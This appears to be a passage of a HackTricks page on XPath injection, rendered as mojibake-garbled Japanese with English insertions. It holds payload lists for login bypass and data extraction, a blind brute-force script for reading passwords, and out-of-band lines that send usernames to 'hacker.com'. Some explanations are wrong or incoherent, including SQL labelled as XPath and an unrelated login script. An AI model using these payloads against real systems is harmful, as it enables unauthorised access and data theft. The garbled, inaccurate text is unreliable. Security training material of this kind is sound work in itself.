ã“ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’æ³¨å…¥ã™ã‚‹ã“ã¨ã§ã€æ”»æ’ƒè€…ã¯æœ‰åŠ¹ãªè³‡æ ¼æƒ…å ±ã‚’æä¾›ã›ãšã«ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚‹ã“ã¨ãŒã§ãã€èªè¨¼ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```
' or '1'='1
" or "1"="1
' or ''='
" or ""="
string(//user[name/text()='' or '1'='1' and password/text()='' or '1'='1']/account/text())

Select account
Select the account using the username and use one of the previous values in the password field
```
### **nullã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®æ‚ªç”¨**

Null injection is a technique used to exploit vulnerabilities in applications that use XPath queries to retrieve data from XML documents. XPath is a language used to navigate through elements and attributes in an XML document.

Null injection occurs when an attacker is able to inject a null value into an XPath query, causing the query to return unintended results or bypass certain security checks.

To understand how null injection works, let's consider an example. Suppose we have a web application that uses an XPath query to retrieve user information from an XML document:

```xml
<users>
  <user>
    <name>John Doe</name>
    <email>john@example.com</email>
  </user>
  <user>
    <name>Jane Smith</name>
    <email>jane@example.com</email>
  </user>
</users>
```

The application may have a functionality that allows users to search for other users by name. The XPath query used to retrieve the user information might look like this:

```xpath
/users/user[name='John Doe']
```

In this example, the query retrieves the user information for the user with the name "John Doe". However, if the application does not properly validate user input and allows an attacker to inject a null value, the query could be manipulated to return unintended results.

For instance, an attacker could inject a null value into the query like this:

```xpath
/users/user[name='' or '1'='1']
```

In this case, the query will return all user information because the condition `'1'='1'` is always true. The attacker can then gather sensitive information about all users, not just the intended target.

To prevent null injection attacks, it is important to properly validate and sanitize user input before using it in XPath queries. Input validation should include checking for null values and ensuring that only expected characters are allowed.

By understanding and exploiting null injection vulnerabilities, attackers can gain unauthorized access to sensitive information and potentially compromise the security of an application. It is crucial for developers and security professionals to be aware of this technique and take appropriate measures to mitigate the risk.
```
Username: ' or 1]%00
```
### **ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¾ãŸã¯ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®ã„ãšã‚Œã‹ã«äºŒé‡ã®OR**ï¼ˆè„†å¼±ãªãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ãŒ1ã¤ã ã‘ã®å ´åˆã«æœ‰åŠ¹ï¼‰

é‡è¦ï¼š**ã€Œandã€ã¯æœ€åˆã«å®Ÿè¡Œã•ã‚Œã‚‹æ“ä½œ**ã§ã‚ã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚
```
Bypass with first match
(This requests are also valid without spaces)
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
string(//user[name/text()='' or true() or '' and password/text()='']/account/text())

Select account
'or string-length(name(.))<10 or' #Select account with length(name)<10
'or contains(name,'adm') or' #Select first account having "adm" in the name
'or contains(.,'adm') or' #Select first account having "adm" in the current value
'or position()=2 or' #Select 2Âº account
string(//user[name/text()=''or position()=2 or'' and password/text()='']/account/text())

Select account (name known)
admin' or '
admin' or '1'='2
string(//user[name/text()='admin' or '1'='2' and password/text()='']/account/text())
```
## æ–‡å­—åˆ—ã®æŠ½å‡º

å‡ºåŠ›ã«ã¯æ–‡å­—åˆ—ãŒå«ã¾ã‚Œã¦ãŠã‚Šã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯å€¤ã‚’æ“ä½œã—ã¦æ¤œç´¢ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```
/user/username[contains(., '+VALUE+')]
```

```
') or 1=1 or (' #Get all names
') or 1=1] | //user/password[('')=(' #Get all names and passwords
') or 2=1] | //user/node()[('')=(' #Get all values
')] | //./node()[('')=(' #Get all values
')] | //node()[('')=(' #Get all values
') or 1=1] | //user/password[('')=(' #Get all names and passwords
')] | //password%00 #All names and passwords (abusing null injection)
')]/../*[3][text()!=(' #All the passwords
')] | //user/*[1] | a[(' #The ID of all users
')] | //user/*[2] | a[(' #The name of all users
')] | //user/*[3] | a[(' #The password of all users
')] | //user/*[4] | a[(' #The account of all users
```
## ç›²ç›®çš„ãªæ”»æ’ƒ

### **å€¤ã®é•·ã•ã‚’å–å¾—ã—ã€æ¯”è¼ƒã«ã‚ˆã£ã¦æŠ½å‡ºã™ã‚‹:**
```bash
' or string-length(//user[position()=1]/child::node()[position()=1])=4 or ''=' #True if length equals 4
' or substring((//user[position()=1]/child::node()[position()=1]),1,1)="a" or ''=' #True is first equals "a"

substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)

... and ( if ( $employee/role = 2 ) then error() else 0 )... #When error() is executed it rises an error and never returns a value
```
### **Pythonã®ä¾‹**

```python
import requests

def login(username, password):
    url = "https://example.com/login"
    payload = {
        "username": username,
        "password": password
    }
    response = requests.post(url, data=payload)
    return response.text

def get_user_data(username):
    url = f"https://example.com/user/{username}"
    response = requests.get(url)
    return response.text

def main():
    username = input("Enter your username: ")
    password = input("Enter your password: ")

    login_response = login(username, password)
    if "Login successful" in login_response:
        user_data = get_user_data(username)
        print(user_data)
    else:
        print("Login failed")

if __name__ == "__main__":
    main()
```

ã“ã®Pythonã®ä¾‹ã§ã¯ã€`requests`ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«å¯¾ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ã—ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ‡ãƒ¼ã‚¿ã‚’å–å¾—ã™ã‚‹æ–¹æ³•ãŒç¤ºã•ã‚Œã¦ã„ã¾ã™ã€‚

`login`é–¢æ•°ã§ã¯ã€æŒ‡å®šã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã€ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‚’è¿”ã—ã¾ã™ã€‚

`get_user_data`é–¢æ•°ã§ã¯ã€æŒ‡å®šã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’ä½¿ç”¨ã—ã¦ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ‡ãƒ¼ã‚¿ã‚’å–å¾—ã™ã‚‹ãŸã‚ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã€ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‚’è¿”ã—ã¾ã™ã€‚

`main`é–¢æ•°ã§ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å…¥åŠ›ã•ã›ã€ãƒ­ã‚°ã‚¤ãƒ³ãŒæˆåŠŸã—ãŸå ´åˆã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ‡ãƒ¼ã‚¿ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚ãƒ­ã‚°ã‚¤ãƒ³ãŒå¤±æ•—ã—ãŸå ´åˆã¯ã€ã€ŒLogin failedã€ã¨è¡¨ç¤ºã•ã‚Œã¾ã™ã€‚

ã“ã®ä¾‹ã¯ã€Pythonã‚’ä½¿ç”¨ã—ã¦Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«å¯¾ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ã—ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ‡ãƒ¼ã‚¿ã‚’å–å¾—ã™ã‚‹åŸºæœ¬çš„ãªæ–¹æ³•ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚
```python
import requests, string

flag = ""
l = 0
alphabet = string.ascii_letters + string.digits + "{}_()"
for i in range(30):
r = requests.get("http://example.com?action=user&userid=2 and string-length(password)=" + str(i))
if ("TRUE_COND" in r.text):
l = i
break
print("[+] Password length: " + str(l))
for i in range(1, l + 1): #print("[i] Looking for char number " + str(i))
for al in alphabet:
r = requests.get("http://example.com?action=user&userid=2 and substring(password,"+str(i)+",1)="+al)
if ("TRUE_COND" in r.text):
flag += al
print("[+] Flag: " + flag)
break
```
### ãƒ•ã‚¡ã‚¤ãƒ«ã®èª­ã¿å–ã‚Š

XPathã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¯ã€Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®è„†å¼±æ€§ã®ä¸€ã¤ã§ã‚ã‚Šã€æ”»æ’ƒè€…ãŒã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‹ã‚‰æƒ…å ±ã‚’æŠ½å‡ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®æ”»æ’ƒã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å…¥åŠ›ã‚’é©åˆ‡ã«æ¤œè¨¼ã›ãšã«XPathã‚¯ã‚¨ãƒªã«ç›´æ¥çµ„ã¿è¾¼ã‚€å ´åˆã«ç™ºç”Ÿã—ã¾ã™ã€‚

æ”»æ’ƒè€…ã¯ã€æ‚ªæ„ã®ã‚ã‚‹XPathã‚¯ã‚¨ãƒªã‚’æ³¨å…¥ã™ã‚‹ã“ã¨ã§ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‹ã‚‰æ©Ÿå¯†æƒ…å ±ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä¾‹ãˆã°ã€ä»¥ä¸‹ã®ã‚ˆã†ãªXPathã‚¯ã‚¨ãƒªã‚’è€ƒãˆã¦ã¿ã¾ã—ã‚‡ã†ã€‚

```plaintext
SELECT * FROM users WHERE username = 'admin' AND password = 'password'
```

æ”»æ’ƒè€…ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼åã®å…¥åŠ›ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã«`' OR '1'='1'--`ã¨ã„ã†å€¤ã‚’å…¥åŠ›ã™ã‚‹ã“ã¨ã§ã€ä»¥ä¸‹ã®ã‚ˆã†ãªXPathã‚¯ã‚¨ãƒªã‚’ç”Ÿæˆã—ã¾ã™ã€‚

```plaintext
SELECT * FROM users WHERE username = '' OR '1'='1'--' AND password = 'password'
```

ã“ã®ã‚¯ã‚¨ãƒªã¯å¸¸ã«çœŸã‚’è¿”ã™ãŸã‚ã€æ”»æ’ƒè€…ã¯ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å†…ã®ã™ã¹ã¦ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼æƒ…å ±ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

XPathã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®æ”»æ’ƒã‚’é˜²ããŸã‚ã«ã¯ã€å…¥åŠ›å€¤ã®é©åˆ‡ãªæ¤œè¨¼ã¨ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ãŒå¿…è¦ã§ã™ã€‚ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å…¥åŠ›ã‚’ä¿¡é ¼ã›ãšã€é©åˆ‡ãªãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã¨ã‚µãƒ‹ã‚¿ã‚¤ã‚ºã‚’è¡Œã†å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã¾ãŸã€ãƒ—ãƒ¬ãƒ¼ã‚¹ãƒ›ãƒ«ãƒ€ã‚’ä½¿ç”¨ã—ã¦ã‚¯ã‚¨ãƒªã‚’æ§‹ç¯‰ã™ã‚‹ã“ã¨ã‚‚æ¨å¥¨ã•ã‚Œã¾ã™ã€‚
```python
(substring((doc('file://protected/secret.xml')/*[1]/*[1]/text()[1]),3,1))) < 127
```
## OOB Exploitation

Out-of-Band (OOB) exploitation is a technique used in XPath injection attacks to extract data from a vulnerable web application. XPath injection occurs when an attacker is able to manipulate an XPath query used by the application to retrieve data from an XML document.

In OOB exploitation, the attacker injects malicious XPath queries that trigger requests to an external server controlled by the attacker. This allows the attacker to extract sensitive information from the application and send it to their own server.

To perform OOB exploitation, the attacker needs to identify a vulnerable parameter in the application that is used in an XPath query. They then inject a payload that includes an XPath function that triggers an HTTP request to their server. The attacker can use various techniques to extract data, such as blind XPath injection or error-based techniques.

Blind XPath injection involves injecting queries that result in a true or false condition, allowing the attacker to infer information based on the application's response. Error-based techniques involve injecting queries that intentionally cause errors in the application, revealing information in the error messages.

Once the attacker successfully extracts data using OOB exploitation, they can use it for various purposes, such as further attacks or data exfiltration. It is important for developers to implement proper input validation and sanitization techniques to prevent XPath injection vulnerabilities and protect sensitive data.
```python
doc(concat("http://hacker.com/oob/", RESULTS))
doc(concat("http://hacker.com/oob/", /Employees/Employee[1]/username))
doc(concat("http://hacker.com/oob/", encode-for-uri(/Employees/Employee[1]/username)))

#Instead of doc() you can use the function doc-available
doc-available(concat("http://hacker.com/oob/", RESULTS))
#the doc available will respond true or false depending if the doc exists,
#user not(doc-available(...)) to invert the result if you need to
```
### è‡ªå‹•ãƒ„ãƒ¼ãƒ«

{% embed url="https://xcat.readthedocs.io/" %}

## å‚è€ƒæ–‡çŒ®

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20injection" %}

<figure><img src="../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProofã¯ã™ã¹ã¦ã®æš—å·ãƒã‚°å ±é…¬ã®å ´ã§ã™ã€‚**

**é…å»¶ãªã—ã§å ±é…¬ã‚’å—ã‘å–ã‚‹**\
HackenProofã®å ±é…¬ã¯ã€é¡§å®¢ãŒå ±é…¬äºˆç®—ã‚’å…¥é‡‘ã—ãŸå¾Œã«é–‹å§‹ã•ã‚Œã¾ã™ã€‚ãƒã‚°ãŒæ¤œè¨¼ã•ã‚ŒãŸå¾Œã«å ±é…¬ã‚’å—ã‘å–ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**Web3ãƒšãƒ³ãƒ†ã‚¹ãƒˆã®çµŒé¨“ã‚’ç©ã‚€**\
ãƒ–ãƒ­ãƒƒã‚¯ãƒã‚§ãƒ¼ãƒ³ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã¨ã‚¹ãƒãƒ¼ãƒˆã‚³ãƒ³ãƒˆãƒ©ã‚¯ãƒˆã¯æ–°ã—ã„ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã§ã™ï¼æˆé•·ã™ã‚‹Web3ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’ãƒã‚¹ã‚¿ãƒ¼ã—ã¾ã—ã‚‡ã†ã€‚

**Web3ãƒãƒƒã‚«ãƒ¼ãƒ¬ã‚¸ã‚§ãƒ³ãƒ‰ã«ãªã‚‹**\
å„æ¤œè¨¼æ¸ˆã¿ã®ãƒã‚°ã”ã¨ã«è©•åˆ¤ãƒã‚¤ãƒ³ãƒˆã‚’ç²å¾—ã—ã€é€±é–“ãƒªãƒ¼ãƒ€ãƒ¼ãƒœãƒ¼ãƒ‰ã®ãƒˆãƒƒãƒ—ã‚’åˆ¶è¦‡ã—ã¾ã—ã‚‡ã†ã€‚

[**HackenProofã§ã‚µã‚¤ãƒ³ã‚¢ãƒƒãƒ—**](https://hackenproof.com/register)ã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ã‹ã‚‰å ±é…¬ã‚’å¾—ã¾ã—ã‚‡ã†ï¼

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ãŠã‚ˆã³** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
